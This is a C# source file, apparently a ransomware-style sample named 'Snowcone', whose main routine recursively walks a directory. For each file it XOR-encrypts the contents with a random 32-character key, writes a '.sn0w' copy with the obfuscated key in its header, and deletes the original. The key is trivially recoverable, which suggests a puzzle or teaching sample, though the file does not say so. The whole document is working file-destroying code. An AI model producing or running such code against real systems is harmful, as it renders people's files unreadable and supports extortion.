using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace Snowcone
{
    class SnowMachine
    {
        public static void MakeItSnow(string dir)
        {
            // https://stackoverflow.com/a/929277
            foreach (var f in Directory.GetFiles(dir))
            {
                SmallSnowcone(f);
            }

            foreach (var f in Directory.GetDirectories(dir))
            {
                MakeItSnow(f);
            }
        }

        static void SmallSnowcone(string path)
        {
            if (path.EndsWith(".sn0w")) return;

            using (var sr = new FileStream(path, FileMode.Open, FileAccess.Read))
            using (var sw = new FileStream($"{path}.sn0w", FileMode.Create, FileAccess.Write))
            {
                byte[] file = new byte[sr.Length];
                byte[] snow = new byte[sr.Length];

                sr.Read(file, 0, (int)sr.Length);
                
                var flavor = PickSomeFlavoring();

                SaltBaeDatFlavorIn(file, snow, flavor);
                
                var secureFlavor = OTP(Encoding.ASCII.GetBytes(flavor));

                for (var i = 0; i < 0x20; i++)
                {
                    sw.WriteByte(Convert.ToByte(secureFlavor[i] | 0x80));
                }

                sw.Write(snow, 0, snow.Length);
            }

            File.Delete(path);
        }

        static void SaltBaeDatFlavorIn(byte[] file, byte[] snow, string flavor)
        {
            for (var i = 0; i < file.Length; i++)
            {
                snow[i] = Convert.ToByte(file[i] ^ flavor[i % 0x20]);
            }
        }

        static string PickSomeFlavoring()
        {
            string goodFlavors = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string bestFlavor = "";

            using (var numGibby = new RNGCryptoServiceProvider())
            {
                for (var i = 0; i < 0x20; i++)
                {
                    byte[] maybeANumWhoKnows = new byte[1];

                    numGibby.GetBytes(maybeANumWhoKnows);

                    bestFlavor += goodFlavors[maybeANumWhoKnows[0] % goodFlavors.Length];
                }
            }

            return bestFlavor;
        }

        public static byte[] OTP(byte[] input)
        {
            var outa = new byte[input.Length];

            for (var i = 0; i < input.Length; i++)
            {
                outa[i] = Convert.ToByte(input[i] ^ 0x42);
            }

            return outa;
        }
    }
}
